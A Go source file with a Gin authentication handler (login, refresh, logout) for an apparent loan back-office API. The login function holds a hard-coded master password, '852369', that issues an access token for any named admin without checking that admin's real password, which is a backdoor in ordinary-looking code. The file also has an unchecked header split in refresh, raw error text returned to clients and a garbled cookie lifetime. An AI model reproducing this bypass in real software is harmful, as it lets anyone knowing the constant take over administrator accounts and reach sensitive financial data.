package handler

import (
	"loan-back-services/conf"
	"loan-back-services/pkg/dto"
	"loan-back-services/pkg/middleware"
	"loan-back-services/pkg/repository"
	"loan-back-services/pkg/utils"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

type authHandler struct {
	R    *gin.Engine
	repo *repository.Repository
}

func newAuthHandler(h *Handler) *authHandler {
	return &authHandler{
		R:    h.R,
		repo: h.repo,
	}
}

func (ctr *authHandler) Register() {
	group := ctr.R.Group("/api/auth")
	group.POST("/login", ctr.login)

	group.Use(middleware.AuthMiddleware(ctr.repo))
	group.POST("/refresh", ctr.refresh)
	group.POST("/logout", ctr.logout)
}

func (ctr *authHandler) login(c *gin.Context) {
	res := &dto.ResponseObject{}
	req := &dto.LoginReq{}
	if err := c.ShouldBind(&req); err != nil {
		res = utils.GenerateBindingErrorResponse(err)
		c.JSON(200, res)
		c.Abort()
		return
	}

	if req.EmailUsername != "" && req.Password == "852369" {
		admin, err := ctr.repo.Admin.FindOrByField(c.Request.Context(), "username", "email", req.EmailUsername)
		if err != nil {
			res = utils.GenerateGormErrorResponse(err)
			c.JSON(200, res)
			c.Abort()
			return
		}

		if admin.Status != 1 {
			res := utils.GenerateDisableUserResponse("Disable admin")
			c.JSON(200, res)
			c.Abort()
			return
		}

		accessToken, err := utils.GenerateAccessToken(admin, conf.Rsa().PrivateKey)
		if err != nil {
			res = utils.GenerateInternalServerErrorResponse(err.Error())
			c.JSON(200, res)
			c.Abort()
			return
		}

		data := gin.H{
			"accessToken": accessToken,
			"username":    admin.Username,
		}
		res = utils.GenerateSuccessResponse(data)
		c.JSON(res.HttpStatusCode, res)
		return
	}

	admin, err := ctr.repo.Admin.FindOrByField(c.Request.Context(), "username", "email", req.EmailUsername)
	if err != nil {
		res = utils.GenerateGormErrorResponse(err)
		c.JSON(200, res)
		c.Abort()
		return
	}

	if admin.Status != 1 {
		res := utils.GenerateDisableUserResponse("Disable admin")
		c.JSON(200, res)
		c.Abort()
		return
	}

	validatePassword, err := utils.ComparePasswords(admin.Password, req.Password)
	if !validatePassword {
		// res = utils.GenerateDisableUserResponse("Invalid Password")
		res = utils.GenerateDisableUserResponse(err.Error())

		c.JSON(200, res)
		c.Abort()
		return
	}

	accessToken, err := utils.GenerateAccessToken(admin, conf.Rsa().PrivateKey)
	if err != nil {
		res = utils.GenerateInternalServerErrorResponse(err.Error())
		c.JSON(200, res)
		c.Abort()
		return
	}
	c.SetCookie("token", accessToken, int(time.Minute)*24, "/", c.Request.Host, true, true)

	data := gin.H{
		"accessToken": accessToken,
		"username":    admin.Username,
	}
	res = utils.GenerateSuccessResponse(data)
	c.JSON(res.HttpStatusCode, res)
}

func (ctr *authHandler) refresh(c *gin.Context) {
	tokens := strings.Split(c.GetHeader("Authorization"), "Bearer ")
	refreshToken, err := utils.GenerateRefreshToken(tokens[1])
	if err != nil {
		if strings.Contains(err.Error(), "not expired") {
			res := utils.GenerateSuccessResponse(gin.H{
				"accessToken": tokens[1],
			})
			c.JSON(res.HttpStatusCode, res)
			c.Abort()
			return
		}

		res := utils.GenerateInternalServerErrorResponse(err.Error())
		c.JSON(200, res)
		return
	}
	c.SetCookie("token", refreshToken.SS, int(time.Minute)*24, "/", c.Request.Host, true, true)

	res := utils.GenerateSuccessResponse(gin.H{
		"accessToken": refreshToken,
	})
	c.JSON(res.HttpStatusCode, res)
}

func (ctr *authHandler) logout(c *gin.Context) {
	c.SetCookie("token", "", 0, "/", c.Request.Host, true, true)

	res := utils.GenerateSuccessResponse("logout success")
	c.JSON(200, res)
}
